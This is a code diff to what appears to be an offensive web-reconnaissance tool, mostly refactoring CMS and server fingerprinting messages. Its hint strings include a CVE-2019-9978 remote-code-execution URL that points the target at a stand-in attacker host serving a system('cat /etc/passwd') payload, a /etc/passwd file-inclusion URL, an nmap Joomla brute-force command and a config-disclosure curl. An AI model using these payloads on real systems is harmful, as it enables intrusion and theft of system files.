@@ -11,7 +11,6 @@ using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Text.Json;
-using System.Text.Json.Nodes;
 using System.Text.RegularExpressions;
 
 namespace Reecon
@@ -266,6 +265,7 @@ namespace Reecon
             return returnInfo.Trim(Environment.NewLine.ToCharArray());
         }
 
+        // Maybe later
         private static void FindNewPages(string pageToScan)
         {
             var pageText = GetHTTPInfo(pageToScan).PageText;
@@ -521,11 +521,14 @@ namespace Reecon
                                         continue;
                                     }
                                 }
-                                catch { }
+                                catch (Exception ex)
+                                {
+                                    Console.WriteLine($"Error in git - Bug Reelix: {ex.Message}");
+                                }
                                 returnText += "--- Download: https://raw.githubusercontent.com/arthaud/git-dumper/master/git_dumper.py" + Environment.NewLine;
                                 returnText += $"--- Run: python3 git_dumper.py {url}{file} .git" + Environment.NewLine;
                                 returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
-                                returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
+                                returnText += "--- Show a specific comm it: git show 2eb93ac (Press q to close)" + Environment.NewLine;
                             }
                             // Kibana!
                             else if (file == "app/kibana")
@@ -1061,7 +1064,7 @@ namespace Reecon
 
                     else if (serverText.StartsWith("ATS/"))
                     {
-                        toReturn += "-- ATS (Apache Traffic Server) Detected!" + Environment.NewLine;
+                        toReturn += "-- ATS (Apache Traffic Server) detected" + Environment.NewLine;
                         string version = serverText.Remove(0, 4);
                         if (version == "7.1.1")
                         {
@@ -1076,7 +1079,7 @@ namespace Reecon
                     // CouchDB
                     else if (serverText.StartsWith("CouchDB/"))
                     {
-                        toReturn += "-- CouchDB Detected!" + Environment.NewLine;
+                        toReturn += "-- CouchDB detected" + Environment.NewLine;
                         var utilsPage = GetHTTPInfo($"{urlWithSlash}_utils/");
                         if (utilsPage.StatusCode == HttpStatusCode.OK || utilsPage.StatusCode == HttpStatusCode.NotModified)
                         {
@@ -1096,7 +1099,7 @@ namespace Reecon
                     // HFS
                     else if (serverText.StartsWith("HFS"))
                     {
-                        toReturn += "-- HTTP File Server (HFS) Detected!" + Environment.NewLine;
+                        toReturn += "-- HTTP File Server (HFS) detected" + Environment.NewLine;
                         if (serverText.Contains("HFS 2.3"))
                         {
                             toReturn += "--- " + "Version likely vulnerable to CVE-2014-6287 - https://www.exploit-db.com/raw/49584".Recolor(Color.Orange) + Environment.NewLine;
@@ -1106,7 +1109,7 @@ namespace Reecon
                     // lighttpd
                     else if (serverText.StartsWith("lighttpd"))
                     {
-                        toReturn += "-- " + "lighttpd Detected" + Environment.NewLine;
+                        toReturn += "-- " + "lighttpd detected" + Environment.NewLine;
                         toReturn += "-- If version is below 1.4.19, check https://www.exploit-db.com/exploits/31396 (CVE-2008-1270)" + Environment.NewLine;
                     }
                     else if (serverText.StartsWith("MiniServ/"))
@@ -1136,7 +1139,7 @@ namespace Reecon
                     }
                     else if (serverText.StartsWith("Werkzeug/"))
                     {
-                        toReturn += "-- " + "Werkzeug Detected" + Environment.NewLine;
+                        toReturn += "-- " + "Werkzeug detected" + Environment.NewLine;
                         var consolePage = GetHTTPInfo($"{urlWithSlash}console");
                         if (consolePage.StatusCode != HttpStatusCode.NotFound)
                         {
@@ -1168,7 +1171,7 @@ namespace Reecon
 
                     if (generator.StartsWith("Drupal"))
                     {
-                        toReturn += "-- Drupal Detected" + Environment.NewLine;
+                        toReturn += "-- Drupal detected" + Environment.NewLine;
                         // TODO: Do these in-code
                         toReturn += $"-- Possible Version Detection: curl -s {baseURL}/CHANGELOG.txt | grep -m2 \"\"" + Environment.NewLine;
                         // Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1
@@ -1187,7 +1190,7 @@ namespace Reecon
 
                     if (poweredBy.Contains("PHP"))
                     {
-                        toReturn += "-- PHP Detected" + Environment.NewLine;
+                        toReturn += "-- PHP detected" + Environment.NewLine;
                         if (poweredBy.Contains("/8.1.0-dev"))
                         {
                             toReturn += "--- " + "Vulnerable PHP Version (PHP/8.1.0-dev) Detected - https://www.exploit-db.com/raw/49933 <-----".Recolor(Color.Orange) + Environment.NewLine;
@@ -1452,9 +1455,9 @@ namespace Reecon
                     }
                     else if (contentValue.StartsWith("WordPress "))
                     {
-
+                        // Do nothing - WordPress is more thoroughly checked further down
                     }
-                    else if (!contentValue.StartsWith("WordPress ")) // WordPress is more thoroughly checked further down
+                    else
                     {
                         toReturn += "- " + (contentValue + " detected!").Recolor(Color.Orange) + Environment.NewLine;
                     }
@@ -1465,7 +1468,7 @@ namespace Reecon
                 {
                     toReturn += "- " + "Confluence detected!".Recolor(Color.Orange) + Environment.NewLine;
                     toReturn += "-- " + "See if you can access /setup/".Recolor(Color.Orange) + Environment.NewLine; // Maybe automate this?
-                                                                                                                        // Get the version
+                                                                                                                     // Get the version
                     string confluenceVersionText = "";
                     if (PageText.Contains("Printed by Atlassian Confluence "))
                     {
@@ -1641,7 +1644,7 @@ namespace Reecon
                 if (PageText.Contains("com_content") && PageText.Contains("com_users"))
                 {
                     toReturn += "- " + "Joomla! Detected".Recolor(Color.Orange) + Environment.NewLine;
-                    toReturn += "- " + $"Brute Force: nmap -p80 -sV --script http-joomla-brute {DNS} --script-args 'userdb=users.txt,passdb=words.txt,http-joomla-brute.uri=/administrator/index.php'".Recolor(Color.Orange);
+                    toReturn += "- " + $"Brute Force: nmap -p80 -sV --script http-joomla-brute {DNS} --script-args 'userdb=users.txt,passdb=words.txt,http-joomla-brute.uri=/administrator/index.php'".Recolor(Color.Orange) + Environment.NewLine;
                     var adminXML = GetHTTPInfo($"{URL}administrator/manifests/files/joomla.xml");
                     if (adminXML.StatusCode == HttpStatusCode.OK)
                     {
@@ -1649,8 +1652,13 @@ namespace Reecon
                         {
                             string versionText = adminXML.PageText.Remove(0, adminXML.PageText.IndexOf("<version>") + "<version>".Length);
                             versionText = versionText.Substring(0, versionText.IndexOf("</version"));
-                            toReturn += "-- " + "Joomla! Version: {versionText}".Recolor(Color.Orange) + Environment.NewLine;
+                            toReturn += "-- " + $"Joomla! Version: {versionText}".Recolor(Color.Orange) + Environment.NewLine;
                             // https://vulncheck.com/blog/joomla-for-rce
+                            if (Version.Parse(versionText) >= Version.Parse("4.0.0") && Version.Parse(versionText) <= Version.Parse("4.2.7"))
+                            {
+                                toReturn += "--- " + $"Vulnerable to CVE CVE-2023-23752!!!".Recolor(Color.Orange) + Environment.NewLine;
+                                // curl -v http://10.10.11.3/api/index.php/v1/config/application?public=true
+                            }
                             // - CVE-2023-23752 - 4.0.0 through 4.2.7
                         }
                     }
@@ -1728,34 +1736,46 @@ namespace Reecon
                     // List Plugins
                     if (PageText.Contains("/wp-content/plugins/"))
                     {
-                        List<string> pluginList = PageText.Split(new string[] { "/wp-content/plugins/" }, StringSplitOptions.None).ToList();
+                        List<string> pluginSearcher = PageText.Split(new string[] { "/wp-content/plugins/" }, StringSplitOptions.None).ToList();
 
                         // If it contains a plugin, then splitting by the plugin string has the first item being the text before it
 
                         // To Test:
                         // 2+ Plugins
                         // See if there is a commonality in the format
-                        if (pluginList.Count >= 2)
+                        if (pluginSearcher.Count >= 2)
                         {
-                            pluginList.RemoveAt(0);
+                            pluginSearcher.RemoveAt(0);
                         }
-                        foreach (string plugin in pluginList)
+                        List<string> pluginList = new List<string>();
+                        foreach (string plugin in pluginSearcher)
                         {
                             // Plugin Found: adrotate/library/jquery.adrotate.clicktracker.js
                             // /wp-content/plugins/adrotate/readme.txt
                             string thePlugin = plugin.Substring(0, plugin.IndexOf(" ") - 1);
-                            toReturn += $"-- Plugin Found: {thePlugin}" + Environment.NewLine;
+                            thePlugin = thePlugin.Substring(0, thePlugin.IndexOf("/"));
+                            if (!pluginList.Contains(thePlugin))
+                            {
+                                pluginList.Add(thePlugin);
+                                toReturn += $"-- Plugin Found: {thePlugin}" + Environment.NewLine;
+                                if (thePlugin == "social-warfare")
+                                {
+                                    toReturn += "--- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Recolor(Color.Orange) + $" - {urlWithSlash}wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
+                                    toReturn += "---- rce.txt: <pre>system('cat /etc/passwd')</pre>" + Environment.NewLine;
+                                    toReturn += $"---- Verify Version: {urlWithSlash}wp-content/plugins/social-warfare/readme.txt - Scroll down to Changelog" + Environment.NewLine;
+                                }
+                                // html5-video-player-pro VS html5-video-player-pro-pro
+                                else if (thePlugin.StartsWith("html5-video-player-pro"))
+                                {
+                                    toReturn += "--- " + "Possible Vulnerable Plugin (HTML5 Video Player Pro) Detected (Vuln if < 2.5.25) - CVE-2024-1061".Recolor(Color.Orange) + Environment.NewLine;
+                                }
+                                else if (thePlugin == "wp-with-spritz")
+                                {
+                                    toReturn += "--- " + "Vulnerable Plugin Detected".Recolor(Color.Orange) + $" - {urlWithSlash}wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd" + Environment.NewLine;
+                                }
+
+                            }
                         }
-                    }
-                    if (PageText.Contains("/wp-with-spritz/"))
-                    {
-                        toReturn += "-- " + "Vulnerable Plugin Detected".Recolor(Color.Orange) + $" - {urlWithSlash}wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd" + Environment.NewLine;
-                    }
-                    else if (PageText.Contains("/wp-content/plugins/social-warfare"))
-                    {
-                        toReturn += "-- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Recolor(Color.Orange) + $" - {urlWithSlash}wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
-                        toReturn += "--- rce.txt: <pre>system('cat /etc/passwd')</pre>" + Environment.NewLine;
-                        toReturn += $"--- Verify Version: {urlWithSlash}wp-content/plugins/social-warfare/readme.txt - Scroll down to Changelog" + Environment.NewLine;
                     }
 
                     // Check for public folders
@@ -1794,6 +1814,10 @@ namespace Reecon
                     if (wpdiscuz.StatusCode == HttpStatusCode.OK && wpdiscuz.PageText.Contains("wpDiscuz "))
                     {
                         toReturn += "-- wpDiscuz detected - Bug Reelix to update this.".Recolor(Color.Orange) + Environment.NewLine;
+                        string version = wpdiscuz.PageText.Remove(0, wpdiscuz.PageText.IndexOf("Stable tag: ") + 12);
+                        version = version.Split(Environment.NewLine)[0];
+                        toReturn += $"--- Location: {urlWithSlash}wp-content/plugins/wpdiscuz/readme.txt" + Environment.NewLine;
+                        toReturn += $"--- Version: {version}" + Environment.NewLine;
                         toReturn += "--- If 7.0.4 -> https://www.exploit-db.com/raw/49967" + Environment.NewLine;
                     }
 
